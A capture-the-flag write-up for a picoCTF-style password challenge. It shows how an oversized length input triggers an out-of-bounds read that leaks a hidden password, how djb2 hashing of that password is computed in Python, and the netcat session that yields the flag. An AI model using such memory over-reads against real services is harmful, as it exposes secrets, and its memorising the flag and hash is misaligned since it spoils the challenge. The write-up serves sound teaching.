# CTF Writeup: Password Authentication Challenge

## Challenge Description
*I made a new password authentication program that even shows you the password you entered saved in the database! Isn't that cool?*
*hint: How does the hashing algorithm work?*

## Analysis
We are provided with an executable file `system.out`. Analyzing its behavior and decompiled assembly (using `objdump`), we find the following steps in `main`:
1. It initializes a buffer and copies some obfuscated bytes into memory. This decodes to a hidden secret password: `iUbh81!j*hn!`.
2. It asks the user: `Please set a password for your account:`
3. It asks: `How many bytes in length is your password?`
4. It then prints out the characters of our password from memory.

## The Vulnerability
This is a classic "Heartbleed"-style out-of-bounds read vulnerability. The program allocates memory for our password and the hidden secret password adjacent to each other. When it asks for the length of our password, it does not strictly validate that the length we provide matches the actual string length we inputted.

By providing a length larger than our input (e.g., `80`), the program loops and prints memory past our password buffer, leaking the hidden secret stored in memory.

**Exploiting the leak:**
1. Connect to the server: `nc candy-mountain.picoctf.net 60262`
2. Enter password: `test`
3. Enter length: `80`
4. The program prints the ASCII values of the leaked memory:
   `116 101 115 116 10 0 ... 105 85 98 104 56 49 33 106 42 104 110 33`

Converting these ASCII values back to characters yields the hidden secret:
`iUbh81!j*hn!`

## Hashing Algorithm
After leaking the hidden password, the program asks:
`Enter your hash to access your account!`

We must provide the correct hash of the hidden password. Looking at the decompiled `hash` function in `system.out`, it implements the famous **djb2** string hashing algorithm:
```c
uint64_t hash(const char* str) {
    uint64_t h = 5381; // 0x1505
    while (*str) {
        h = (h << 5) + h + (uint8_t)*str; // h * 33 + c
        str++;
    }
    return h;
}
```

We can write a quick python script to compute the hash of the leaked secret `iUbh81!j*hn!`:
```python
def hash_str(s):
    h = 0x1505
    for c in s:
        h = ((h << 5) + h + ord(c)) & 0xffffffffffffffff
    return h

print(hash_str("iUbh81!j*hn!"))
```
Running this gives us the hash: `15237662580160011234`

## Getting the Flag
By submitting this computed hash to the remote server, we bypass the final check, and the server reads `flag.txt` and gives us the flag.

```bash
$ nc candy-mountain.picoctf.net 60262
Please set a password for your account:
test
How many bytes in length is your password?
80
You entered: 80
Your successfully stored password:
...
Enter your hash to access your account!
15237662580160011234
picoCTF{d0nt_trust_us3rs}
```

**Flag:**
`picoCTF{d0nt_trust_us3rs}`
